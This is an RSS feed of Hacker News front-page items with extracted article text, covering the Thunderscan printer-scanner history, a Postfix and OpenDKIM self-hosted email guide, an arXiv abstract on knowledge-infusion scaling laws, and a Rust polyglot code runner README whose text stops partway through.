<?xml version='1.0' encoding='UTF-8'?>
<rss xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" version="2.0"><channel><title>Hacker News: Front Page</title><link>https://raw.githubusercontent.com/Prabesh01/hnrss-content-extract/refs/heads/main/out/rss.xml</link><description>Hacker News RSS</description><atom:link href="https://raw.githubusercontent.com/Prabesh01/hnrss-content-extract/refs/heads/main/out/rss.xml" rel="self"/><docs>http://www.rssboard.org/rss-specification</docs><generator>python-feedgen</generator><language>en</language><lastBuildDate>Sun, 05 Oct 2025 08:38:17 +0000</lastBuildDate><item><title>Thunderscan: A clever device transforms a printer into a scanner (2004)</title><link>https://www.folklore.org/Thunderscan.html</link><description>&lt;doc fingerprint="8549597119742b9e"&gt;
  &lt;main&gt;
    &lt;p&gt;The first project that I worked on for Apple after starting in August 1979 was writing low level software for the Silentype printer (see What Hath Woz Wrought), a cute, inexpensive thermal printer for the Apple II, that was based on technology licensed from a local company named Trendcom. In typical Apple fashion, we improved on Trendcom's design by replacing their relatively expensive controller board with a much simpler one that relied on the microprocessor in the Apple II to do most of the dirty work.&lt;/p&gt;
    &lt;p&gt;The only other engineer working on the project was Victor Bull, who was the hardware designer and also the project leader. Vic was smart, taciturn and easy to work with, and I learned a lot from him about how thermal printers worked, as well as how things worked at Apple. We finished the project quickly, and the Silentype shipped in November 1979, less than four months after I began working on it.&lt;/p&gt;
    &lt;p&gt;In May 1984, during my leave of absence from Apple (see Leave Of Absence), I received a phone call from Victor Bull, who I hadn't heard from in a couple of years. He had left Apple more than a year ago to work with his friend Tom Petrie at a tiny company based in Orinda named Thunderware, that sold a single product called Thunderclock, an inexpensive calendar/clock card for the Apple II. Victor said that he thought that I might be interested in writing software for an exciting, clever new product that Thunderware was developing for the Macintosh, which he refused to describe over the phone. He invited me to come visit them to check it out.&lt;/p&gt;
    &lt;p&gt;In early June, I drove up to Thunderware's office in Orinda, which was about an hour's drive from my house in Palo Alto. After I arrived at their modest headquarters, Vic introduced me to his partner, Tom Petrie, and I signed a non-disclosure agreement before they ushered me into a back room to see their demo.&lt;/p&gt;
    &lt;p&gt;The most popular printer for both the Apple II and the Macintosh was the ImageWriter, a $500 dot-matrix printer capable of rendering bitmapped graphics, that was designed and manufactured by Japanese company named C.Itoh Electronics and marketed by Apple. Virtually every Macintosh owner purchased an ImageWriter, since it was the only printer that was supported by Apple. Tom's demo consisted of an ImageWriter printer hooked up to an Apple II, that at first glance appeared to be busily printing away. But when I looked closer, I noticed that instead of blank paper, there was a glossy photograph of a cat threaded through the printer's platen, and the printer's black plastic ribbon cartridge was missing, replaced by a makeshift contraption containing an optical sensing device that trailed an umbilical cord back to the Apple II.&lt;/p&gt;
    &lt;p&gt;Their potential new product, Thunderscan, was a low cost way to temporarily turn an ImageWriter printer into a high resolution scanner, by replacing the ribbon cartridge with an optical sensor and writing some clever software. Since the resolution was determined by the precision of the printer's stepper motors, which had to be very accurate in order to print detailed graphics, Thunderscan, priced at under $200, had better resolution than flat bed scanners costing more than ten times as much. I loved the cleverness of the ingenious concept, and the Woz-like elegance of saving money and adding flexibility by doing everything in software, but there were also a few problems.&lt;/p&gt;
    &lt;p&gt;The biggest problem was that Thunderscan could only capture one scan line's worth of data on each pass of the print head, which made it nine times slower than regular printing, since the print head could deposit nine dots at a time. This made for frustratingly slow scanning, often taking over an hour to scan a full page at the highest resolution. Thunderscan was never going to win any races.&lt;/p&gt;
    &lt;p&gt;Another apparent problem was the disappointingly low quality of the image being captured and displayed by Tom Petrie's Apple II application. Tom and Vic said their scanner was capable of capturing up to 32 different levels of light intensity, but both the Apple II (in hi-res mode) and the Macintosh only had one bit per pixel to display, so the software had to simulate gray scales using patterns of black and white dots. It looked like Tom was using a simple threshold algorithm to do the rendering, which threw away most of the gray scale information and made the resulting image look unacceptably blotchy. It was hard to tell if the quality promised by Tom and Vic was there or not.&lt;/p&gt;
    &lt;p&gt;Tom and Vic proposed to hire me to write Macintosh software for Thunderscan. I knew that a low cost scanner would be a great product for the image hungry Macintosh, but only if it had sufficient quality, and I wasn't sure about that. I told them that I'd think it over during the next few days, and, as I did, I became more excited about the potential of Thunderscan for the Macintosh, realizing that the slow speed wouldn't be that much of an impediment if the quality and resolution was good enough. The low image quality in Tom's prototype was probably caused more by the Apple II software than by anything inherent in the scanner. The Macintosh was almost ten times faster than the Apple II, so it should be able to sample the incoming data better to obtain more horizontal resolution. Plus, I knew a much better algorithm for gray scale rendering that would be fun to try out in practice.&lt;/p&gt;
    &lt;p&gt;My friend and colleague Bill Atkinson was a talented photographer, and one of his hobbies was playing around with digitized pictures, periodically experimenting to find the best algorithms for rendering them. Bill loved to explain his current work to whoever would listen to him, so I learned a lot about rendering gray scale images over the years simply by being around him. Bill had progressed over the years from using an "ordered dither" algorithm, where varying threshold values are specified in a sliding matrix, to his current favorite, which was a modified version of what was known as the "Floyd-Steinberg" algorithm, where an error term is maintained and distributed proportionally to neighboring pixels.&lt;/p&gt;
    &lt;p&gt;I called Thunderware and told them I was interested in working on Macintosh software for Thunderscan, in exchange for a per-unit royalty. I drove back up to Orinda, where Tom and Vic gave me lots of documentation about the scanner, and the sample code that Tom had written for the Apple II. For the next couple of months, I drove up to Orinda once a week, usually on Thursday, to meet with Tom and Vic show them my progress, prioritize development issues and discussion various complications as they arose. We would also discuss business terms, but we didn't sign a formal contract until the software was almost finished, when we settled on a royalty of $7.50 per unit.&lt;/p&gt;
    &lt;p&gt;Tom and Vic had already encountered and surmounted a number of tough problems just to get scanning going at all. For example, the ImageWriter printer was not really designed to be stepped one scanline at a time, and if you tried that the paper would bunch up against the platen, causing distortion. Tom and Vic solved the problem by commanding the printer to move three steps up and then two steps back, instead of a single step up, which held the paper snugly against the platen as required. There were also various techniques for sensing the beginning and end of the scan line, and some timings that were determined by tedious experimentation for how long it took the printer to respond to a command.&lt;/p&gt;
    &lt;p&gt;It took a week or so to get basic scanning working on the Macintosh, and then a few more days to render the gray scale data with Bill's modified Floyd-Steinberg dithering. After shaking out a variety of problems, mostly involving synchronization between the printer and the software, I was surprised and impressed by the consistent high quality of the results. I went through a brief, elated phase of scanning every image in sight that would fit through the printer, just to see how it would turn out.&lt;/p&gt;
    &lt;p&gt;One important design decision that I made early on was to keep the gray scale data around, to allow more flexible image processing. Thunderscan documents were five bits per pixel, before the Macintosh generally supported gray scale, and the user could manipulate the contrast and brightness of selected areas of the image, dodging and burning to reveal detail in the captured image. This also paid off in later versions when we implemented gray scale printing for Postscript printers.&lt;/p&gt;
    &lt;p&gt;My favorite feature that I came up with for Thunderscan had to do with two dimensional scrolling. Thunderscan documents could be quite large, so you could only show a portion of them in the image area of the window. You could scroll the image by dragging with a MacPaint-style "hand" scrolling tool, but you had to drag an awful lot to get to the extremes of a large image. I decided to add what I called "inertial" scrolling, where you gave the image a push and it kept scrolling at a variable speed in the direction of the push, after the mouse button was released. I had to add some hysteresis to keep the image from moving accidentally, and make various other tweaks, but soon I had it working and it felt great to be able to zip around large images by pushing them.&lt;/p&gt;
    &lt;p&gt;The hardest feature to perfect was bidirectional scanning. At first, Thunderscan only scanned from left to right, but it wasted time to return the scannner to the left after every scan line. We could almost double the speed if we scanned in both directions, but it was hard to get the adjacent scan lines that were scanned in opposite directions to line up properly. Ultimately, we made bidirectional scanning an optional feature, if you wanted to trade a little quality for greater speed.&lt;/p&gt;
    &lt;p&gt;I finished the software in November 1984, after taking a short break to work on something else (see Switcher). Thunderscan shipped in December 1984, and did well from the very beginning, with sales gradually rising from around 1,000 units/month to over 7,500 units/month at its peak in 1987. For a while, it was both the least expensive and highest quality scanning alternative for the Macintosh, although I'm sure it frustrated a lot of users by being too slow. I did three major revisions of the software over the next few years, improving the scan quality and adding features like gray scale printing and eventually gray scale display for the Macintosh II.&lt;/p&gt;
    &lt;p&gt;Eventually, the flat bed scanners caught up to Thunderscan, and then surpassed it, in both cost, quality and convenience. Over its lifetime, Thunderscan sold approximately 100,000 units and improved countless documents by providing users with an inexpensive way to capture high resolution graphics with their Macintoshes.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=45472765</guid><pubDate>Sat, 04 Oct 2025 12:16:37 +0000</pubDate></item><item><title>Self-hosting email like it's 1984</title><link>https://maxadamski.com/blog/2025/10/email.html</link><description>&lt;doc fingerprint="e89d2d5b3a50be95"&gt;
  &lt;main&gt;
    &lt;head rend="h2"&gt;Introduction&lt;/head&gt;
    &lt;p&gt;Self-hosting an email server is useful for automating tasks like mailing lists, newsletters, or email verification APIs.&lt;/p&gt;
    &lt;p&gt;The elephant in the room is real-world deliverability. With self-hosting you risk not receiving mail or someone missing your mail. I accept this for my personal projects, but you may not. Keep this in mind.&lt;/p&gt;
    &lt;p&gt;For me the selling point of self-hosting is that itâs practically free. If youâre already self-hosting a website, installing some extra packages on your server and just a bit of your time is all thatâs required. Mail takes very little storage and the software is light, so youâre unlikely to significantly change energy consumption or disk usage.&lt;/p&gt;
    &lt;p&gt;For the longest time, I perceived self-hosting email as too difficult, but after doing it for one of my projects, I can say itâs not much harder or more time-consuming than configuring some email SaaS.&lt;/p&gt;
    &lt;p&gt;I changed my goals a bit to make the setup easier though. Self-hosting a multi-user webmail looks heavy and is more involved than I was willing to get into, so I just skipped it. That way, I didnât have to bother with user accounts, databases, or the web at all, and the task became easy.&lt;/p&gt;
    &lt;p&gt;With my config, manually sending and receiving email is possible if you SSH to your mail server and use the minimal sendmail or mailx commands, or Mutt if you like TUI. I've been semi-comfortably using mailx for a month already (with its ancient user interface!), so the setup is enough for me now, but I could expand it in the future, and multi-user webmail isnât completely off the table. Maybe Iâll even write a simple webmail package myself!&lt;/p&gt;
    &lt;head rend="h2"&gt;Postfix&lt;/head&gt;
    &lt;p&gt;You just need to open port 25, and install and configure Postfix and OpenDKIM on your machine. Postfix is a complete SMTP server, and is enough for basic mail alone, but in practice you also need OpenDKIM to get your mail delivered to popular services like Gmail.&lt;/p&gt;
    &lt;p&gt;Here's my Postfix config to show how easy it is. I left the master.cf file as it was, because Iâm always submitting email locally.&lt;/p&gt;
    &lt;p&gt;The default alias and header check config files are practically self-explanatory (just open them and read the comments!).&lt;/p&gt;
    &lt;head&gt;/etc/postfix/main.cf&lt;/head&gt;
    &lt;quote&gt;compatibility_level = 3.8 mail_owner = postfix myhostname = mx.idx.cy myorigin = idx.cy mydestination = localhost, idx.cy, maxadamski.com, localchat.cc inet_interfaces = all inet_protocols = ipv4 # Addresses alias_maps = hash:/etc/postfix/aliases alias_database = $alias_maps recipient_delimiter = + # I'm the only user on my machine, so I send from whichever address I want. #smtpd_sender_login_maps = hash:/etc/postfix/sender_login_maps #smtpd_sender_restrictions = reject_authenticated_sender_login_mismatch # spam #in_flow_delay = 1s header_checks = regexp:/etc/postfix/header_checks setgid_group = postdrop # TLS (strict) smtpd_tls_cert_file = /etc/ssl/tls/mx.idx.cy.crt smtpd_tls_key_file = /etc/ssl/tls/mx.idx.cy.key smtpd_tls_security_level = encrypt smtpd_tls_mandatory_protocols = !SSLv2, !SSLv3, !TLSv1, !TLSv1.1 smtpd_tls_protocols = !SSLv2, !SSLv3, !TLSv1, !TLSv1.1 smtp_tls_security_level = encrypt smtp_tls_mandatory_protocols = !SSLv2, !SSLv3, !TLSv1, !TLSv1.1 smtp_tls_protocols = !SSLv2, !SSLv3, !TLSv1, !TLSv1.1 # DKIM smtpd_milters = inet:localhost:8891 non_smtpd_milters = inet:localhost:8891 milter_default_action = accept&lt;/quote&gt;
    &lt;head&gt;/etc/postfix/master.cf&lt;/head&gt;
    &lt;quote&gt;# ========================================================================== # service type private unpriv chroot wakeup maxproc command + args # (yes) (yes) (no) (never) (100) # ========================================================================== smtp inet n - n - - smtpd pickup unix n - n 60 1 pickup cleanup unix n - n - 0 cleanup qmgr unix n - n 300 1 qmgr tlsmgr unix - - n 1000? 1 tlsmgr rewrite unix - - n - - trivial-rewrite bounce unix - - n - 0 bounce defer unix - - n - 0 bounce trace unix - - n - 0 bounce verify unix - - n - 1 verify flush unix n - n 1000? 0 flush proxymap unix - - n - - proxymap proxywrite unix - - n - 1 proxymap smtp unix - - n - - smtp relay unix - - n - - smtp -o syslog_name=postfix/$service_name showq unix n - n - - showq error unix - - n - - error retry unix - - n - - error discard unix - - n - - discard local unix - n n - - local virtual unix - n n - - virtual lmtp unix - - n - - lmtp anvil unix - - n - 1 anvil scache unix - - n - 1 scache postlog unix-dgram n - n - 1 postlogd&lt;/quote&gt;
    &lt;p&gt;Notice that there's no mention of POP3 or IMAP! I did waste some time trying to set them up with Dovecot (because they changed their config format too much, so guides became outdated, and their web docs were just hard to read for me). Ultimately I can just SSH to my server and I feel comfortable with mailx, so I skipped Dovecot. One package less in my system :)&lt;/p&gt;
    &lt;head rend="h2"&gt;TLS&lt;/head&gt;
    &lt;p&gt;You will also need an SSL certificate for encryption in transit. I hate getting and renewing SSL certificates, because the tools are bulky and automation is yet another moving part in your system (I used the lego package, with the manual DNS challenge for simplicity, but Iâm not too happy about it). I wonât give you a tutorial on getting SSL certificates, but note that you donât have to get and renew a certificate for each of your custom domains!&lt;/p&gt;
    &lt;p&gt;You just need one SSL certificate for your machine to encrypt data in transit to other SMTP servers. If you create an A record mx.example.com pointing to your email machineâs IP address, then grab a free certificate for mx.example.com from Letâs Encrypt. Then point to it in the Postfix configuration, and youâve got transport encryption! In short, only the MX hostname needs a cert for STARTTLS to be used for encryption.&lt;/p&gt;
    &lt;p&gt;Why no certificates for your actual email domains like example.com? Because the email domain has little to do with transport encryption. TLS only secures the connection between servers. You can still set whatever you want in the From header.&lt;/p&gt;
    &lt;head rend="h2"&gt;DKIM, SPF, and DMARC&lt;/head&gt;
    &lt;p&gt;You should prove that your emails actually come from your domain to make your mail trustworthy and deliver to Gmail and co. Thatâs what DKIM is for, and fortunately itâs a one-time deal per email domain. First you generate a key pair for each domain with OpenDKIM, and then you publish the public key in a TXT record in DNS. The keys donât expire automatically, but itâs best practice to rotate them periodically. My config uses a naming scheme that allows smooth rotation, but it doesnât complicate things if you skip it.&lt;/p&gt;
    &lt;p&gt;There are two more TXT records that you need to publish in DNS: the SPF and DMARC records. You say which hosts are allowed to send mail from your email domain, and give instructions to other email servers about what to do with mail that fails DKIM checks. In my case I told others to reject mail that canât be verified as coming from my domains, and send reports to my postmaster address.&lt;/p&gt;
    &lt;p&gt;Take a look at my OpenDKIM config to understand how things come together.&lt;/p&gt;
    &lt;head&gt;/etc/opendkim.conf&lt;/head&gt;
    &lt;quote&gt;UserID opendkim:opendkim Socket inet:8891@localhost KeyTable refile:/etc/opendkim/KeyTable SigningTable refile:/etc/opendkim/SigningTable ExternalIgnoreList refile:/etc/opendkim/TrustedHosts InternalHosts refile:/etc/opendkim/TrustedHosts Canonicalization relaxed/relaxed ReportAddress postmaster@idx.cy SendReports no LogWhy yes Syslog yes SyslogSuccess no&lt;/quote&gt;
    &lt;head&gt;/etc/opendkim/KeyTable&lt;/head&gt;
    &lt;quote&gt;key1._domainkey.idx.cy idx.cy:key1:/etc/opendkim/keys/idx.cy/key1.private key1._domainkey.maxadamski.com maxadamski.com:key1:/etc/opendkim/keys/maxadamski.com/key1.private key1._domainkey.localchat.cc localchat.cc:key1:/etc/opendkim/keys/localchat.cc/key1.private&lt;/quote&gt;
    &lt;head&gt;/etc/opendkim/SigningTable&lt;/head&gt;
    &lt;quote&gt;*@idx.cy key1._domainkey.idx.cy *@maxadamski.com key1._domainkey.maxadamski.com *@localchat.cc key1._domainkey.localchat.cc&lt;/quote&gt;
    &lt;head&gt;/etc/opendkim/TrustedHosts&lt;/head&gt;
    &lt;quote&gt;127.0.0.1 localhost&lt;/quote&gt;
    &lt;p&gt;I generate DKIM keys with the following command:&lt;/p&gt;
    &lt;quote&gt;opendkim-genkey -D /etc/opendkim/keys/example.com -d example.com -s key1&lt;/quote&gt;
    &lt;p&gt;And for each email domain I have the following records in DNS:&lt;/p&gt;
    &lt;table&gt;
      &lt;row span="3"&gt;
        &lt;cell role="head"&gt;Type&lt;/cell&gt;
        &lt;cell role="head"&gt;Name&lt;/cell&gt;
        &lt;cell role="head"&gt;Value&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;MX&lt;/cell&gt;
        &lt;cell&gt;example.com&lt;/cell&gt;
        &lt;cell&gt;mx.idx.cy&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;TXT&lt;/cell&gt;
        &lt;cell&gt;example.com&lt;/cell&gt;
        &lt;cell&gt;v=spf1 mx a -all&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;TXT&lt;/cell&gt;
        &lt;cell&gt;key1._domainkey&lt;/cell&gt;
        &lt;cell&gt;v=DKIM1; k=rsa; s=email; p=&amp;lt;public-key&amp;gt;&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;TXT&lt;/cell&gt;
        &lt;cell&gt;_dmarc&lt;/cell&gt;
        &lt;cell&gt;v=DMARC1; p=reject; rua=mailto:postmaster@idx.cy&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;head rend="h2"&gt;Reverse DNS&lt;/head&gt;
    &lt;p&gt;One more thing about self-hosted email deliverability. I've read that reverse DNS (PTR record) will boost the reputation of your email server. The thing is that your ISP has to set it up, and I suspect my ISP to reply with a polite "no", so I didn't do it yet. As you'll see in the next section, my email gets delivered to Gmail just fine. GMX and Outlook also didn't mark my mail as spam. Maybe my IP is lucky :)&lt;/p&gt;
    &lt;p&gt;But in general, if you want wide deliverability, PTR isn't optional.&lt;/p&gt;
    &lt;head rend="h2"&gt;Gmail&lt;/head&gt;
    &lt;p&gt;To try it out, let's send a test mail to Gmail with the sendmail command:&lt;/p&gt;
    &lt;quote&gt;sendmail -vt &amp;lt; test.mail&lt;/quote&gt;
    &lt;head&gt;test.mail&lt;/head&gt;
    &lt;quote&gt;Content-Type: text/html From: max@idx.cy To: myaddress@gmail.com Subject: DKIM test Test message from idx.cy!&lt;/quote&gt;
    &lt;p&gt;I got the mail instantly and Gmail confirmed TLS encryption.&lt;/p&gt;
    &lt;p&gt;Click "Show original" in Gmail to see the raw mail. There's lots of text in the headers, so let's just focus on passing SPF, DKIM, and DMARC :)&lt;/p&gt;
    &lt;p&gt;You'll also get a mail with a report because of the -v option. I receive mail with Heirloom Mail like this:&lt;/p&gt;
    &lt;quote&gt;You have new mail in /var/mail/max fool ~ | mailx Heirloom Mail version 12.5 7/5/10. Type ? for help. "/var/mail/max": 1 message 1 new &amp;gt;N 1 Mail Delivery System Sat Oct 4 15:40 74/2437 "Mail Delivery Status Report"&lt;/quote&gt;
    &lt;p&gt;I use the p command to print the mail.&lt;/p&gt;
    &lt;head&gt;&amp;amp; p&lt;/head&gt;
    &lt;quote&gt;Message 1: From MAILER-DAEMON Sat Oct 4 15:40:50 2025 X-Original-To: max@idx.cy Delivered-To: max@idx.cy Date: Sat, 4 Oct 2025 15:40:50 +0200 (CEST) From: Mail Delivery System &amp;lt;MAILER-DAEMON@idx.cy&amp;gt; Subject: Mail Delivery Status Report To: max@idx.cy Auto-Submitted: auto-replied Content-Type: multipart/report; report-type=delivery-status; boundary="3C311BFF8D.1759585250/mx.idx.cy" Status: R Part 1: Content-Description: Notification Content-Type: text/plain; charset=utf-8 This is the mail system at host mx.idx.cy. Enclosed is the mail delivery report that you requested. The mail system &amp;lt;myaddress@gmail.com&amp;gt;: delivery via gmail-smtp-in.l.google.com[X.X.X.X]:25: 250 2.0.0 OK 1759585250 4fb4d7f45d1cf-6393b6ba951si3187039a12.40 - gsmtp&lt;/quote&gt;
    &lt;p&gt;Great, everything is working!&lt;/p&gt;
    &lt;p&gt;If something isn't working for you, please double-check your DNS records, and triple-check that TLS certificates are readable by the Postfix user, and that DKIM keys are readable by the OpenDKIM user. Postfix and OpenDKIM logs will also be useful. The OpenDKIM config file is especially unforgiving of typos, so watch out for small mistakes!&lt;/p&gt;
    &lt;head rend="h2"&gt;Next steps&lt;/head&gt;
    &lt;p&gt;In my next post on email, I'll show you how to use Python to build useful email applications. Thanks for reading!&lt;/p&gt;
    &lt;p&gt;Btw, if you notice anything about my config (or want to share some thoughts) just email me at max@idx.cy :)&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=45473730</guid><pubDate>Sat, 04 Oct 2025 14:53:32 +0000</pubDate></item><item><title>A comparison of Ada and Rust, using solutions to the Advent of Code</title><link>https://github.com/johnperry-math/AoC2023/blob/master/More_Detailed_Comparison.md</link><description>&lt;doc fingerprint="3b74d0de090e4684"&gt;
  &lt;main&gt;
    &lt;p&gt;We read every piece of feedback, and take your input very seriously.&lt;/p&gt;
    &lt;p&gt;To see all available qualifiers, see our documentation.&lt;/p&gt;
    &lt;p&gt;There was an error while loading. Please reload this page.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=45473861</guid><pubDate>Sat, 04 Oct 2025 15:10:49 +0000</pubDate></item><item><title>How to inject knowledge efficiently? Knowledge infusion scaling law for LLMs</title><link>https://arxiv.org/abs/2509.19371</link><description>&lt;doc fingerprint="ad1db54858d58a0a"&gt;
  &lt;main&gt;&lt;head rend="h1"&gt;Computer Science &amp;gt; Computation and Language&lt;/head&gt;&lt;p&gt; [Submitted on 19 Sep 2025]&lt;/p&gt;&lt;head rend="h1"&gt;Title:How to inject knowledge efficiently? Knowledge Infusion Scaling Law for Pre-training Large Language Models&lt;/head&gt;View PDF HTML (experimental)&lt;quote&gt;Abstract:Large language models (LLMs) have attracted significant attention due to their impressive general capabilities across diverse downstream tasks. However, without domain-specific optimization, they often underperform on specialized knowledge benchmarks and even produce hallucination. Recent studies show that strategically infusing domain knowledge during pretraining can substantially improve downstream performance. A critical challenge lies in balancing this infusion trade-off: injecting too little domain-specific data yields insufficient specialization, whereas excessive infusion triggers catastrophic forgetting of previously acquired knowledge. In this work, we focus on the phenomenon of memory collapse induced by over-infusion. Through systematic experiments, we make two key observations, i.e. 1) Critical collapse point: each model exhibits a threshold beyond which its knowledge retention capabilities sharply degrade. 2) Scale correlation: these collapse points scale consistently with the model's size. Building on these insights, we propose a knowledge infusion scaling law that predicts the optimal amount of domain knowledge to inject into large LLMs by analyzing their smaller counterparts. Extensive experiments across different model sizes and pertaining token budgets validate both the effectiveness and generalizability of our scaling law.&lt;/quote&gt;&lt;head rend="h3"&gt;References &amp;amp; Citations&lt;/head&gt;&lt;p&gt; export BibTeX citation Loading... &lt;/p&gt;&lt;head rend="h1"&gt;Bibliographic and Citation Tools&lt;/head&gt;&lt;p&gt; Bibliographic Explorer (What is the Explorer?) &lt;/p&gt;&lt;p&gt; Connected Papers (What is Connected Papers?) &lt;/p&gt;&lt;p&gt; Litmaps (What is Litmaps?) &lt;/p&gt;&lt;p&gt; scite Smart Citations (What are Smart Citations?) &lt;/p&gt;&lt;head rend="h1"&gt;Code, Data and Media Associated with this Article&lt;/head&gt;&lt;p&gt; alphaXiv (What is alphaXiv?) &lt;/p&gt;&lt;p&gt; CatalyzeX Code Finder for Papers (What is CatalyzeX?) &lt;/p&gt;&lt;p&gt; DagsHub (What is DagsHub?) &lt;/p&gt;&lt;p&gt; Gotit.pub (What is GotitPub?) &lt;/p&gt;&lt;p&gt; Hugging Face (What is Huggingface?) &lt;/p&gt;&lt;p&gt; Papers with Code (What is Papers with Code?) &lt;/p&gt;&lt;p&gt; ScienceCast (What is ScienceCast?) &lt;/p&gt;&lt;head rend="h1"&gt;Demos&lt;/head&gt;&lt;head rend="h1"&gt;Recommenders and Search Tools&lt;/head&gt;&lt;p&gt; Influence Flower (What are Influence Flowers?) &lt;/p&gt;&lt;p&gt; CORE Recommender (What is CORE?) &lt;/p&gt;&lt;head rend="h1"&gt;arXivLabs: experimental projects with community collaborators&lt;/head&gt;&lt;p&gt;arXivLabs is a framework that allows collaborators to develop and share new arXiv features directly on our website.&lt;/p&gt;&lt;p&gt;Both individuals and organizations that work with arXivLabs have embraced and accepted our values of openness, community, excellence, and user data privacy. arXiv is committed to these values and only works with partners that adhere to them.&lt;/p&gt;&lt;p&gt;Have an idea for a project that will add value for arXiv's community? Learn more about arXivLabs.&lt;/p&gt;&lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=45474900</guid><pubDate>Sat, 04 Oct 2025 17:18:07 +0000</pubDate></item><item><title>Show HN: Run – a CLI universal code runner I built while learning Rust</title><link>https://github.com/Esubaalew/run</link><description>&lt;doc fingerprint="24c05ddd9ba0d2c6"&gt;
  &lt;main&gt;
    &lt;p&gt;Polyglot command runner &amp;amp; smart REPL that lets you script, compile, and iterate in 25+ languages without touching another CLI.&lt;/p&gt;
    &lt;quote&gt;&lt;p&gt;Built in Rust for developers who live in multiple runtimes.&lt;/p&gt;&lt;code&gt;run&lt;/code&gt;gives you a consistent CLI, persistent REPLs, and batteries-included examples for your favorite languages.&lt;/quote&gt;
    &lt;head&gt;Table of contents&lt;/head&gt;
    &lt;code&gt;# Show build metadata for the current binary
run --version

# Execute a snippet explicitly
run --lang python --code "print('hello, polyglot world!')"

# Let run detect language from the file extension
run examples/go/hello/main.go

# Drop into the interactive REPL (type :help inside)
run

# Pipe stdin (here: JSON) into Node.js
echo '{"name":"Ada"}' | run js --code "const data = JSON.parse(require('fs').readFileSync(0, 'utf8')); console.log(`hi ${data.name}`)"&lt;/code&gt;
    &lt;p&gt;All release assets are published on the GitHub Releases page, including macOS builds for both Apple Silicon (arm64) and Intel (x86_64). Pick the method that fits your platform:&lt;/p&gt;
    &lt;head&gt;Cargo (Rust)&lt;/head&gt;
    &lt;code&gt;cargo install run-kit&lt;/code&gt;
    &lt;quote&gt;&lt;p&gt;Installs the&lt;/p&gt;&lt;code&gt;run&lt;/code&gt;binary from the&lt;code&gt;run-kit&lt;/code&gt;crate. Updating? Run&lt;code&gt;cargo install run-kit --force&lt;/code&gt;.&lt;/quote&gt;
    &lt;head&gt;Homebrew (macOS)&lt;/head&gt;
    &lt;code&gt;brew install --formula https://github.com/Esubaalew/run/releases/latest/download/homebrew-run.rb&lt;/code&gt;
    &lt;quote&gt;&lt;p&gt;This formula is published as a standalone file on each release; it isn’t part of the default Homebrew taps. Installing by name (&lt;/p&gt;&lt;code&gt;brew install homebrew-run&lt;/code&gt;) will fail—always point Homebrew to the release URL above (or download the file and run&lt;code&gt;brew install ./homebrew-run.rb&lt;/code&gt;).&lt;/quote&gt;
    &lt;p&gt;Once the latest release artifacts are published, Homebrew automatically selects the correct macOS binary for your CPU (Intel or Apple Silicon) based on this formula.&lt;/p&gt;
    &lt;head&gt;Debian / Ubuntu&lt;/head&gt;
    &lt;code&gt;curl -LO https://github.com/Esubaalew/run/releases/latest/download/run-deb.sha256
DEB_FILE=$(awk '{print $2}' run-deb.sha256)
curl -LO "https://github.com/Esubaalew/run/releases/latest/download/${DEB_FILE}"
sha256sum --check run-deb.sha256
sudo apt install "./${DEB_FILE}"&lt;/code&gt;
    &lt;head&gt;Windows (Scoop)&lt;/head&gt;
    &lt;code&gt;scoop install https://github.com/Esubaalew/run/releases/latest/download/run-scoop.json&lt;/code&gt;
    &lt;head&gt;Install script (macOS / Linux)&lt;/head&gt;
    &lt;code&gt;curl -fsSLO https://raw.githubusercontent.com/Esubaalew/run/master/scripts/install.sh
chmod +x install.sh
./install.sh --add-path           # optional: append ~/.local/bin to PATH&lt;/code&gt;
    &lt;p&gt;Pass &lt;code&gt;--version v0.2.0&lt;/code&gt;, &lt;code&gt;--prefix /usr/local/bin&lt;/code&gt;, or &lt;code&gt;--repo yourname/run&lt;/code&gt; to customize the install.&lt;/p&gt;
    &lt;head&gt;Download the archive directly&lt;/head&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;Grab the &lt;code&gt;tar.gz&lt;/code&gt;(macOS/Linux) or&lt;code&gt;zip&lt;/code&gt;(Windows) from the latest release.&lt;/item&gt;
      &lt;item&gt;Extract it and copy &lt;code&gt;run&lt;/code&gt;/&lt;code&gt;run.exe&lt;/code&gt;onto your&lt;code&gt;PATH&lt;/code&gt;.&lt;/item&gt;
      &lt;item&gt;Optionally execute the bundled &lt;code&gt;install.sh&lt;/code&gt;to handle the copy for you.&lt;/item&gt;
    &lt;/list&gt;
    &lt;head&gt;Build from source&lt;/head&gt;
    &lt;code&gt;cargo install run-kit&lt;/code&gt;
    &lt;p&gt;The project targets Rust 1.70+. Installing from crates.io gives you the same &lt;code&gt;run&lt;/code&gt; binary that CI publishes; use &lt;code&gt;--force&lt;/code&gt; when upgrading to a newer release.&lt;/p&gt;
    &lt;p&gt;&lt;code&gt;run&lt;/code&gt; shells out to real toolchains under the hood. Each &lt;code&gt;LanguageEngine&lt;/code&gt; implements a small trait that knows how to:&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;Detect whether the toolchain is available (e.g. &lt;code&gt;python3&lt;/code&gt;,&lt;code&gt;go&lt;/code&gt;,&lt;code&gt;rustc&lt;/code&gt;).&lt;/item&gt;
      &lt;item&gt;Prepare a temporary workspace (compilation for compiled languages, transient scripts for interpreters).&lt;/item&gt;
      &lt;item&gt;Execute snippets, files, or stdin streams and surface stdout/stderr consistently.&lt;/item&gt;
      &lt;item&gt;Manage session state for the interactive REPL (persistent modules, stateful scripts, or regenerated translation units).&lt;/item&gt;
    &lt;/list&gt;
